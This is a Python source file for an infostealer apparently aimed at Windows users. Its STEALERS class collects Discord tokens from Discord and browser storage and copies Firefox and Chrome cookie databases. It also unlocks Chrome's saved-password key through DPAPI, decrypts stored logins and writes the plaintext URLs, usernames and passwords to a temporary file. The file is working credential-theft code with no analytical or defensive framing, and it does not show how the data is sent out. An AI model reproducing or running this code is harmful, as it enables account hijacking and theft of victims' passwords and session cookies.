import os, re, sqlite3, UTILS, base64, json
import win32crypt
from binascii import hexlify
from Crypto.Cipher import DES3, AES
class STEALERS:
    def __init__(self):
        self.local = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
    def discord_tokens(self):
        toke = []
        token_paths = [
            self.roaming + '\\Discord\\Local Storage\\leveldb',
            self.roaming + '\\discordcanary\\Local Storage\\leveldb',
            self.roaming + '\\discordptb\\Local Storage\\leveldb',
            self.local + "\\Google\\Chrome\\User Data\\Default",
            self.roaming + "\\Opera Software\\Opera Stable",
            self.local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            self.local + "\\Yandex\\YandexBrowser\\User Data\\Default"
        ]
        for location in token_paths:
            try:
                if os.path.exists(location):
                    for files in os.listdir(location):
                        with open("{}\\{}".format(location, files), errors='ignore') as _d:
                            regex = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", _d.read())
                            if regex:
                                for token in regex:
                                    toke.append(token)
            except:
                pass
        ret = ""
        for x in toke:
            ret += x + '\n'
        return "TOKENS:\n" + UTILS.pretty_printer2(ret[:-1], 60)
    def firefox_cookies(self):
        firefox = self.roaming + "\\Mozilla\\Firefox\\Profiles"
        for top in os.listdir(firefox):
            if os.path.exists(firefox + "\\" + top + "\\logins.json"):
                firefox += "\\%s" % (top)
                break
        firefox_cookies = firefox + "\\cookies.sqlite"
        if(os.path.exists(firefox_cookies)) == True:
            backup_cookies = UTILS.copy_file(firefox_cookies, os.getenv("TEMP") + "\\firefox_cookies.sqlite")
            return backup_cookies
        else:
            return False
    def chrome_cookies(self):
        chrome_cookies = self.local + "\\Google\\Chrome\\User Data\\Default\\Cookies"
        if os.path.exists(chrome_cookies) == True:
            chrome_cookies = UTILS.copy_file(chrome_cookies, os.getenv("TEMP") + "\\chrome_cookies.sqlite")
        if os.path.exists(chrome_cookies) == True:
            return os.path.abspath(chrome_cookies)
        else:
            return False
    def chrome_passwords(self):
        def get_chome_key():
            with open(self.local + "\\Google\\Chrome\\User Data\\Local State", encoding="utf-8") as k:
                ck = json.loads(k.read())
                k.close()
            decrypted = win32crypt.CryptUnprotectData(base64.b64decode(ck["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
            return decrypted
        def backup_db():
            p = os.path.join(self.local, 'Google\\Chrome\\User Data\\Default\\Login Data')
            if os.path.exists(p):
                a = UTILS.copy_file(p, os.getenv("TEMP") + "\\login_data")
                return a
        def decrypt_pass(cont):
            try:
                iv = cont[3:15]
                data = cont[15:]
                ciph = AES.new(get_chome_key(), AES.MODE_GCM, iv)
                decrypted = ciph.decrypt(data)
                decrypted = decrypted[:-16].decode()
                return decrypted
            except:
                decrypted = win32crypt.CryptUnprotectData(cont, None, None, None, 0)
                return decrypted[1]
        passwords = ""
        db = backup_db()
        conn = sqlite3.connect(db)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value from logins")
        for item in cursor.fetchall():
            if item[0] != "":
                passwords += f"WEBS: {item[0]}\nUSER: {item[1]}\nPASS: {decrypt_pass(item[2])}\n\n"
        passwords_path = os.getenv("TEMP") + "\\chromez.txt"
        with open(passwords_path, 'w') as writeout:
            writeout.write(str(passwords))
            writeout.close()
        return os.path.abspath(passwords_path)